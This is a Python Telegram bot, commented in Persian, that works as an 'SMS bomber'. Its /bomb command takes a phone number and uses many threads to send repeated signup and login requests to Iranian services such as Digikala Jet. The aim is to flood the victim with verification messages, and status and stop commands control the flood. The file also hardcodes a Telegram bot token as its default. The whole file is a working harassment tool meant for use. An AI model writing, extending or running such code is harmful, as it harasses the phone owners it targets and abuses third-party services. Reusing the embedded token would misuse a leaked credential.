import random
import threading
import time
import requests
import phonenumbers
import os
import telebot

# توکن از تنظیمات رندر (Environment Variables) خونده میشه
BOT_TOKEN = os.environ.get('BOT_TOKEN', '9209441056:AAHzHXJK-oEIBQeUbi8vOpa0jZwvz4a772Q')

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
bot_state = {"running": False, "phone": "", "success": 0, "fail": 0}
current_bot_bomber = None

class Bomber:
    def __init__(self, phone_number, log_callback=None, progress_callback=None):
        self.phone_number = phone_number
        self.log_callback = log_callback
        self.progress_callback = progress_callback
        self.services = []
        self.load_services()
        
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.stop_event = threading.Event()
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.completed_requests = 0
        self.rate_limited_services = []

    def log(self, message):
        if self.log_callback:
            self.log_callback(message)

    def update_progress(self):
        if self.progress_callback:
            self.progress_callback(self.completed_requests, self.total_requests)

    def load_services(self):
        suffix = self.phone_number.split("+98")[1] if "+98" in self.phone_number else self.phone_number.lstrip("0")
        
        # ⚠️ لیست سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            # بقیه سرویس‌ها رو از فایل اصلیت کپی کن
        ]

    def validate_phone(self):
        try:
            parsed = phonenumbers.parse(self.phone_number, None)
            return phonenumbers.is_valid_number(parsed)
        except:
            return False

    def send_request(self, service):
        if self.stop_event.is_set():
            return
            
        if "+98" not in self.phone_number and "ir" not in service['url'].lower():
            self.completed_requests += 1
            self.update_progress()
            return

        try:
            data = service['data']()
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            method = service['method'].upper()
            use_json = service.get('json', False)

            if method == 'POST':
                if use_json:
                    resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else:
                    resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)

            if resp.status_code in (200, 201, 202, 204):
                self.success_count += 1
                self.log(f"✅ {service['name']}: Success")
            elif resp.status_code in (400, 401, 403, 429):
                self.fail_count += 1
                self.log(f"⚠️ {service['name']}: Rate limited")
            else:
                self.fail_count += 1
                self.log(f"❓ {service['name']}: Status {resp.status_code}")
        except Exception:
            self.fail_count += 1
            self.log(f"❌ {service['name']}: Timeout")
        finally:
            self.completed_requests += 1
            self.update_progress()

    def worker(self, services_subset):
        for service in services_subset:
            if self.stop_event.is_set():
                break
            self.send_request(service)
            time.sleep(random.uniform(0.1, 0.5))

    def run_cycles(self, threads, cycles, delay):
        service_count = len(self.services)
        threads = min(threads, 30)
        chunk_size = max(1, service_count // threads)
        service_chunks = [self.services[i:i + chunk_size] for i in range(0, service_count, chunk_size)]

        for cycle in range(1, cycles + 1):
            if self.stop_event.is_set():
                break
            thread_list = []
            for chunk in service_chunks:
                if self.stop_event.is_set():
                    break
                t = threading.Thread(target=self.worker, args=(chunk,))
                t.daemon = True
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join(timeout=2)
            time.sleep(delay)

    def start(self, threads=10, cycles=2, delay=2):
        if not self.validate_phone():
            self.log("❌ Invalid phone number!")
            return

        self.success_count = 0
        self.fail_count = 0
        self.completed_requests = 0
        self.total_requests = len(self.services) * cycles
        self.stop_event.clear()

        self.log(f"🚀 Starting on {self.phone_number}")
        self.run_cycles(threads, cycles, delay)
        self.log(f"✅ Done! Success: {self.success_count} | Failed: {self.fail_count}")

    def stop(self):
        self.stop_event.set()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    text = "ربات آماده است!\n/bomb [شماره] : شروع ارسال\n/status : وضعیت\n/stop : توقف"
    bot.reply_to(message, text)

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    global current_bot_bomber, bot_state
    if bot_state["running"]:
        bot.reply_to(message, "⚠️ یک عملیات در حال اجراست.")
        return

    try:
        phone = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "❌ لطفاً شماره را وارد کنید. مثال: /bomb 09123456789")
        return

    if not phone.startswith("+"):
        phone = "+98" + phone.lstrip("0")

    bot_state["running"] = True
    bot_state["phone"] = phone
    bot_state["success"] = 0
    bot_state["fail"] = 0
    
    bot.reply_to(message, f"🚀 شروع عملیات برای {phone}")

    def bot_log(msg):
        if "Done" in msg or "Error" in msg or "Starting" in msg:
            bot.send_message(message.chat.id, msg)

    def bot_progress(completed, total):
        bot_state["success"] = current_bot_bomber.success_count
        bot_state["fail"] = current_bot_bomber.fail_count

    current_bot_bomber = Bomber(phone, bot_log, bot_progress)

    def run_bot_bomb():
        global bot_state
        try:
            current_bot_bomber.start(threads=15, cycles=2)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
        finally:
            bot_state["running"] = False
            bot.send_message(
                message.chat.id, 
                f"✅ عملیات تمام شد!\nموفق: {current_bot_bomber.success_count}\nناموفق: {current_bot_bomber.fail_count}"
            )

    threading.Thread(target=run_bot_bomb, daemon=True).start()

@bot.message_handler(commands=['status'])
def handle_status(message):
    if bot_state["running"]:
        text = f"📊 وضعیت:\nشماره: {bot_state['phone']}\nموفق: {bot_state['success']}\nناموفق: {bot_state['fail']}"
    else:
        text = "💤 در حال حاضر هیچ عملیاتی در حال اجرا نیست."
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global current_bot_bomber, bot_state
    if bot_state["running"] and current_bot_bomber:
        current_bot_bomber.stop()
        bot_state["running"] = False
        bot.reply_to(message, "⏹️ عملیات متوقف شد.")
    else:
        bot.reply_to(message, "⚠️ هیچ عملیاتی در حال اجرا نیست.")

if __name__ == "__main__":
    print("🤖 ربات روشن شد...")
    bot.infinity_polling()
